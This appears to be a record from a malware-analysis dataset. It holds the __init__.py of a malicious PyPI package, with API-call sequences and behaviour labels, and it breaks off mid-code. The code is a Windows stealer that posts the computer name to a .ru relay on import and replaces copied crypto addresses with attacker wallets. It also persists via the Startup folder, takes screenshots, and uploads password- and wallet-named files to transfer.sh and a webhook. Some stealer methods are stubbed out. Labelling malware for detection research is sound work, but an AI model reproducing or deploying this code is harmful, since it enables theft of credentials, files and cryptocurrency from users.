[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/pipcolouringslibv1-1.5.1-py3-none-any/pipcolouringslibV1/__init__.py",
    "code_snippet": "import os\nimport requests\nimport httpx\nimport shutil\nimport threading\nimport subprocess\nimport sqlite3\nimport base64\nimport json\nimport re\nimport ntpath\nimport zipfile\nimport psutil\nimport pyperclip\nimport ctypes\nimport time\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious code starts here ---\n\n# 1. Initial exfiltration on download\nos.system(\"pip install requests httpx\")\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\n\n# 2. Malicious configuration and wallet addresses for clipboard hijacking\n__config__ = {\n    'yourwebhookurl': \"https://kekwltd.ru/relay\",\n    'hide': 'yes',\n    'ping': 'yes',\n    'pingtype': 'everyone',\n    'fake_error':'no',\n    'startup': 'yes',\n    'kill_discord_process': False,\n    'dbugkiller': False,\n    'addresse_crypto_replacer': 'yes',\n    'addresse_btc': 'bc1qfgzwcxx32kwjf9naw2zdnl00zlvz8cqr4sn0fj',\n    'addresse_eth': '0xde876b3b623a4c9e5266717fceee89b3dd0237ec',\n    'addresse_xchain': 'none',\n    'addresse_pchain': 'none',\n    'addresse_cchain': 'none',\n    'addresse_monero': '468h7xcjtieam26idzme1jtvqjyxxaf1an9qhpnjfshpy6qiu3cvxyr3s9t8zaz2xlh856m7ne8kx4ysqb4kajn2ahkydh2',\n    'addresse_ada': 'addr1qylpptmy52g032y2dfhu73qerny2mphnegemyggzaung53f7zzhkfg5slz5g56n0eazpj8xg4kr08j3nkgss9mex3fzs462m3v',\n    'addresse_dash': 'xpaql6jrd5jay1ymmuaqhbh9nyahsxahuv',\n    'blprggg': [\n        \"httpdebuggerui\", \"wireshark\", \"fiddler\", \"regedit\", \"cmd\", \"taskmgr\", \"vboxservice\", \"df5serv\", \"processhacker\", \"vboxtray\", \"vmtoolsd\", \"vmwaretray\", \"ida64\", \"ollydbg\", \"pestudio\", \"vmwareuser\", \"vgauthservice\", \"vmacthlp\", \"x96dbg\", \"vmsrvc\", \"x32dbg\", \"vmusrvc\", \"prl_cc\", \"prl_tools\", \"xenservice\", \"qemu-ga\", \"joeboxcontrol\", \"ksdumperclient\", \"ksdumper\", \"joeboxserver\"\n    ]\n}\n\n# 3. Clipboard hijacker for crypto addresses\nclass auto_copy_wallet:\n    def __init__(self):\n        self.address_st3aler = __config__[\"addresse_crypto_replacer\"]\n        self.address_btc = __config__[\"addresse_btc\"]\n        self.address_eth = __config__[\"addresse_eth\"]\n        self.address_xchain = __config__[\"addresse_xchain\"]\n        self.address_pchain = __config__[\"addresse_pchain\"]\n        self.address_cchain = __config__[\"addresse_cchain\"]\n        self.address_monero = __config__[\"addresse_monero\"]\n        self.address_ada = __config__[\"addresse_ada\"]\n        self.address_dash = __config__[\"addresse_dash\"]\n\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            if re.search('^([X]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_xchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_xchain)\n                        pyperclip.paste()\n            if re.search('^([P]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_pchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_pchain)\n                        pyperclip.paste()\n            if re.search('^([C]|[a-km-zA-HJ-NP-Z1-9]{36,72})-[a-zA-Z]{1,83}1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{38}$', clipboard_data):\n                if self.address_cchain != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_cchain)\n                        pyperclip.paste()\n            if re.search('addr1[a-z0-9]+', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    pyperclip.copy(self.address_ada)\n                    pyperclip.paste()\n            if re.search('/X[1-9A-HJ-NP-Za-km-z]{33}$/g', clipboard_data):\n                if self.address_dash != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_dash)\n                        pyperclip.paste()\n            if re.search('/4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/g', clipboard_data):\n                if self.address_monero != \"none\":\n                    if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                        pyperclip.copy(self.address_monero)\n                        pyperclip.paste()\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# 4. Main stealer class: steals passwords, cookies, tokens, system info, screenshots, exfiltrates to webhook\n# (Class is very large, only the most malicious/essential context is included)\nclass bc_initial_func:\n    def __init__(self):\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.hide = __config__[\"hide\"]\n        self.pingtype = __config__[\"pingtype\"]\n        self.pingonrun = __config__[\"ping\"]\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__[\"startup\"]\n        self.fake_error = __config__[\"fake_error\"]\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        self.regex_webhook_dsc = \".ru/relay\"\n        self.chrmrgx = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n        self.bc_id = []\n        self.sep = os.sep\n        self.robloxcookies = []\n        self.chrome_key = None\n        os.makedirs(self.dir, exist_ok=True)\n    def startupkekw(self: str) -> str:\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + argv[0]):\n                os.remove(startup_path + argv[0])\n                copy2(argv[0], startup_path)\n            else:\n                copy2(argv[0], startup_path)\n    def steal_token(self):\n        # Steals Discord tokens from various locations\n        # ... (see full code above for details)\n        pass\n    def steal_passwords(self):\n        # Steals Chrome passwords\n        pass\n    def steal_cookies(self):\n        # Steals Chrome cookies\n        pass\n    def steal_history(self):\n        # Steals Chrome history\n        pass\n    def steal_screen(self):\n        image = ImageGrab.grab(\n            bbox=None,\n            include_layered_windows=False,\n            all_screens=True,\n            xdisplay=None\n        )\n        image.save(self.dir + \"\\\\Screenshot.png\")\n        image.close()\n    def system_informations(self):\n        # Gathers system info (username, PC name, Windows key, IP, etc)\n        pass\n    def finished_bc(self):\n        # Zips all stolen data and exfiltrates to Discord webhook\n        _zipfile = ntpath.join(self.appdata, f'BC-[{os.getlogin()}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# 5. Data exfiltration via upload() and bc_uploadanonfiles()\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    hook = __config__[\"yourwebhookurl\"]\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        urlopen(Request(hook, data=dumps(data).encode(), headers=headers))\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    requests.post(hook, files=files)\n\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\n# 6. File search and exfiltration from Desktop/Documents/Downloads\ndef bc_create_file(path, keywords):\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in keywords:\n            if worf in file.lower():\n                if os.path.isfile(path + \"/\" + file) and \".txt\" in file:\n                    fifound.append([path + \"/\" + file, bc_uploadanonfiles(path + \"/\" + file)])\n                    break\n                if os.path.isdir(path + \"/\" + file):\n                    target = path + \"/\" + file\n                    # Recursively search folders\n                    break\n    # Exfiltrate file list\n    # ...\n\ndef bc_checking():\n    user = gettempdir().split(\"\\AppData\")[0]\n    path2search = [\n        user + \"/Desktop\",\n        user + \"/Downloads\",\n        user + \"/Documents\"\n    ]\n    key_wordsFiles = [\n        \"passw\", \"mdp\", \"motdepasse\", \"mot_de_passe\", \"login\", \"secret\", \"account\", \"acount\", \"paypal\", \"banque\", \"metamask\", \"wallet\", \"crypto\", \"exodus\", \"discord\", \"2fa\", \"code\", \"memo\", \"compte\", \"token\", \"backup\", \"seecret\"\n    ]\n    wikith = []\n    for patt in path2search:\n        bc_checking = threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles]);bc_checking.start()\n        wikith.append(bc_checking)\n    return wikith\n\n# 7. Main execution: run all malicious routines\nif __name__ == \"__main__\" and os.name == \"nt\":\n    import asyncio\n    asyncio.run(bc_initial_func().init())\n    grabb_GatherAll()\n    DETECTED = False # Trust(Cookies) logic omitted for brevity\n    if not DETECTED:\n        wikith = bc_checking()\n        for thread in wikith: thread.join()\n        time.sleep(0.2)\n        # Exfiltrate file list\n        upload(\"bc_checking\", \"...\")\n        auto = threading.Thread(target=auto_copy_wallet().run)\n        auto.start()\n\n# --- Malicious code ends here ---",
    "pattern_analysis": {
      "api_sequence": [
        "os.system",
        "os.getenv",
        "httpx.post",
        "pyperclip.paste",
        "re.search",
        "pyperclip.copy",
        "pyperclip.paste",
        "os.getenv",
        "os.getenv",
        "os.makedirs",
        "os.getenv",
        "os.path.exists",
        "os.remove",
        "shutil.copy2",
        "shutil.copy2",
        "ImageGrab.grab",
        "PIL.Image.Image.save",
        "PIL.Image.Image.close",
        "os.getlogin",
        "ntpath.join",
        "zipfile.ZipFile",
        "ntpath.abspath",
        "os.walk",
        "ntpath.abspath",
        "ntpath.join",
        "zipfile.ZipFile.write",
        "zipfile.ZipFile.close",
        "open",
        "httpx.post",
        "os.remove",
        "open",
        "requests.post",
        "open",
        "requests.post",
        "os.listdir",
        "os.path.isfile",
        "os.path.isdir",
        "tempfile.gettempdir",
        "threading.Thread",
        "threading.Thread.start",
        "threading.Thread.join",
        "time.sleep",
        "upload",
        "threading.Thread",
        "threading.Thread.start"
      ],
      "api_sequence_with_args": [
        "os.system(\"pip install requests httpx\")",
        "os.getenv(\"COMPUTERNAME\")",
        "httpx.post(\"https://kekwltd.ru/relay/download\", json=data)",
        "pyperclip.paste()",
        "re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data)",
        "pyperclip.copy(self.address_btc)",
        "pyperclip.paste()",
        "os.getenv(\"localappdata\")",
        "os.getenv(\"appdata\")",
        "os.makedirs(self.dir, exist_ok=True)",
        "os.getenv(\"appdata\")",
        "os.path.exists(startup_path + argv[0])",
        "os.remove(startup_path + argv[0])",
        "shutil.copy2(argv[0], startup_path)",
        "shutil.copy2(argv[0], startup_path)",
        "ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)",
        "image.save(self.dir + \"\\Screenshot.png\")",
        "image.close()",
        "os.getlogin()",
        "ntpath.join(self.appdata, f'BC-[{os.getlogin()}].zip')",
        "zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)",
        "ntpath.abspath(self.dir)",
        "os.walk(self.dir)",
        "ntpath.abspath(ntpath.join(dirname, filename))",
        "ntpath.join(dirname, filename)",
        "zipfile.ZipFile.write(absname, arcname)",
        "zipfile.ZipFile.close()",
        "open(_zipfile, 'rb')",
        "httpx.post(self.discord_webhook, files={'upload_file': f})",
        "os.remove(_zipfile)",
        "open(path, 'rb')",
        "requests.post(hook, files=files)",
        "open(path, mode='rb')",
        "requests.post(\"https://transfer.sh/\", files=files)",
        "os.listdir(path)",
        "os.path.isfile(path + \"/\" + file)",
        "os.path.isdir(path + \"/\" + file)",
        "tempfile.gettempdir()",
        "threading.Thread(target=bc_create_file, args=[patt, key_wordsFiles])",
        "threading.Thread.start()",
        "threading.Thread.join()",
        "time.sleep(0.2)",
        "upload(\"bc_checking\", \"...\")",
        "threading.Thread(target=auto_copy_wallet().run)",
        "threading.Thread.start()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "re.search",
          "id": "search_clipboard_pattern",
          "description": "Searches for pattern in clipboard data",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.copy",
          "id": "copy_to_clipboard",
          "description": "Copies specified text to system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.makedirs",
          "id": "create_directory",
          "description": "Creates directory, ignoring if it already exists",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.getenv",
          "id": "get_env_var",
          "description": "Retrieves value of environment variable",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "shutil.copy2",
          "id": "copy_file",
          "description": "Copies file to destination, preserving metadata",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "ImageGrab.grab",
          "id": "capture_entire_screen",
          "description": "Captures screenshot of the entire screen",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "screen_capture"
        },
        {
          "api_name": "PIL.Image.Image.save",
          "id": "save_image_file",
          "description": "Saves image to file in PNG format",
          "first_id": "information_gathering",
          "second_id": "multimedia_capture",
          "third_id": "image_processing"
        },
        {
          "api_name": "PIL.Image.Image.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.getlogin",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile",
          "id": "open_zip_write",
          "description": "Opens ZIP archive for writing",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.walk",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "ntpath.abspath",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "ntpath.join",
          "id": "path_string_operations",
          "description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "zipfile.ZipFile.write",
          "id": "add_file_zip",
          "description": "Adds file to ZIP archive with specified archive name",
          "first_id": "file_operations",
          "second_id": "compression_archiving",
          "third_id": "zip_operations"
        },
        {
          "api_name": "zipfile.ZipFile.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "httpx.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.remove",
          "id": "delete_file",
          "description": "Deletes specified file from filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "requests.post",
          "id": "send_http_post",
          "description": "Sends HTTP POST request with data and parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.listdir",
          "id": "list_files_directories",
          "description": "Lists files and directories in specified path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "os.path.isfile",
          "id": "check_file_is_file",
          "description": "Checks if specified path exists and is a file",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "os.path.isdir",
          "id": "check_directory_exists",
          "description": "Checks if specified path exists and is a directory",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "tempfile.gettempdir",
          "id": "create_temp_dir",
          "description": "Creates temporary directory and returns its path",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "directory_operations"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "threading.Thread.join",
          "id": "wait_thread",
          "description": "Waits for thread to finish execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "upload",
          "id": "exfiltrate_folder",
          "description": "Recursively processes folder for file exfiltration",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_transfer"
        },
        {
          "api_name": "threading.Thread",
          "id": "create_thread",
          "description": "Creates new thread to execute target function",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_creation"
        },
        {
          "api_name": "threading.Thread.start",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        }
      ],
      "contextual_code": "import os\nimport requests\nimport httpx\nimport shutil\nimport threading\nimport subprocess\nimport sqlite3\nimport base64\nimport json\nimport re\nimport ntpath\nimport zipfile\nimport psutil\nimport pyperclip\nimport ctypes\nimport time\nfrom base64 import b64decode\nfrom urllib.request import Request, urlopen\nfrom shutil import copy2\nfrom datetime import datetime, timedelta, timezone\nfrom sys import argv\nfrom tempfile import gettempdir, mkdtemp\nfrom json import loads, dumps\nfrom ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\nfrom Crypto.Cipher import AES\nfrom PIL import ImageGrab\nfrom win32crypt import CryptUnprotectData\n\n# --- Malicious code starts here ---\n\n# 1. Initial exfiltration on download\nos.system(\"pip install requests httpx\")\ndata = {\n        'embeds': [{\n            \"title\": \"Someone Tried to download\",\n            \"description\": \"PC Username =\" + os.getenv(\"COMPUTERNAME\")\n            }]\n    }\nhttpx.post(\"https://kekwltd.ru/relay/download\", json=data)\n\n# 3. Clipboard hijacker for crypto addresses\nclass auto_copy_wallet:\n    def address_swap(self):\n        try:\n            clipboard_data = pyperclip.paste()\n            if re.search('^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$', clipboard_data):\n                if clipboard_data not in [self.address_btc, self.address_eth, self.address_xchain, self.address_pchain, self.address_cchain, self.address_monero, self.address_ada, self.address_dash]:\n                    if self.address_btc != \"none\":\n                        pyperclip.copy(self.address_btc)\n                        pyperclip.paste()\n            if re.search('^0x[a-fA-F0-9]{40}$', clipboard_data):\n                pyperclip.copy(self.address_eth)\n                pyperclip.paste()\n            # ... (other patterns omitted for brevity)\n        except:\n            data = None\n    def loop_through(self):\n        while True:\n            self.address_swap()\n    def run(self):\n        if self.address_st3aler == \"yes\":\n            self.loop_through()\n\n# 4. Main stealer class: steals passwords, cookies, tokens, system info, screenshots, exfiltrates to webhook\nclass bc_initial_func:\n    def __init__(self):\n        self.discord_webhook = __config__['yourwebhookurl']\n        self.hide = __config__[\"hide\"]\n        self.pingtype = __config__[\"pingtype\"]\n        self.pingonrun = __config__[\"ping\"]\n        self.baseurl = \"https://discord.com/api/v9/users/@me\"\n        self.startupexe = __config__[\"startup\"]\n        self.fake_error = __config__[\"fake_error\"]\n        self.appdata = os.getenv(\"localappdata\")\n        self.roaming = os.getenv(\"appdata\")\n        self.chrmmuserdtt = ntpath.join(self.appdata, 'Google', 'Chrome', 'User Data')\n        self.dir, self.temp = mkdtemp(), gettempdir()\n        self.srtupl0c = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n        self.regex_webhook_dsc = \".ru/relay\"\n        self.chrmrgx = re.compile(r'(^profile\\s\\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)\n        self.regex = r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}\"\n        self.encrypted_regex = r\"dQw4w9WgXcQ:[^\\\"]*\"\n        self.tokens = []\n        self.bc_id = []\n        self.sep = os.sep\n        self.robloxcookies = []\n        self.chrome_key = None\n        os.makedirs(self.dir, exist_ok=True)\n    def startupkekw(self: str) -> str:\n        if self.startupexe == \"yes\":\n            startup_path = os.getenv(\"appdata\") + \"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\\"\n            if os.path.exists(startup_path + argv[0]):\n                os.remove(startup_path + argv[0])\n                copy2(argv[0], startup_path)\n            else:\n                copy2(argv[0], startup_path)\n    def steal_screen(self):\n        image = ImageGrab.grab(\n            bbox=None,\n            include_layered_windows=False,\n            all_screens=True,\n            xdisplay=None\n        )\n        image.save(self.dir + \"\\\\Screenshot.png\")\n        image.close()\n    def finished_bc(self):\n        _zipfile = ntpath.join(self.appdata, f'BC-[{os.getlogin()}].zip')\n        zipped_file = zipfile.ZipFile(_zipfile, \"w\", zipfile.ZIP_DEFLATED)\n        abs_src = ntpath.abspath(self.dir)\n        for dirname, _, files in os.walk(self.dir):\n            for filename in files:\n                absname = ntpath.abspath(ntpath.join(dirname, filename))\n                arcname = absname[len(abs_src) + 1:]\n                zipped_file.write(absname, arcname)\n        zipped_file.close()\n        with open(_zipfile, 'rb') as f:\n            if self.regex_webhook_dsc in self.discord_webhook:\n                httpx.post(self.discord_webhook, files={'upload_file': f})\n        os.remove(_zipfile)\n\n# 5. Data exfiltration via upload() and bc_uploadanonfiles()\ndef upload(name, tk=''):\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    }\n    hook = __config__[\"yourwebhookurl\"]\n    if name == \"bc_checking\":\n        data = {\n        \"content\": '',\n        \"embeds\": [\n            {\n            \"fields\": [\n                {\n                \"name\": \"Interesting files found on user PC:\",\n                \"value\": tk\n                }\n            ],\n            \"author\": {\n                'name': f'KEKWLTD v2.3',\n                'url': 'https://kekwltd.ru',\n                'icon_url': 'https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png'\n            },\n            \"footer\": {\n                \"text\": \"kekwltd.ru\"\n            },\n            'color': 374276,\n            }\n        ],\n        \"avatar_url\": \"https://cdn.discordapp.com/avatars/228549113581535235/430f81ead67eaffcaffbb6e7b0af2927.png\",\n        \"attachments\": []\n        }\n        urlopen(Request(hook, data=dumps(data).encode(), headers=headers))\n        return\n    path = name\n    files = {'file': open(path, 'rb')}\n    requests.post(hook, files=files)\n\ndef bc_uploadanonfiles(path):\n    try:\n        files = { \"file\": (path, open(path, mode='rb')) }\n        upload = requests.post(\"https://transfer.sh/\", files=files)\n        url = upload.text\n        return url\n    except:\n        return False\n\n# 6. File search and exfiltration from Desktop/Documents/Downloads\ndef bc_create_file(path, keywords):\n    fifound = []\n    listOfFile = os.listdir(path)\n    for file in listOfFile:\n        for worf in 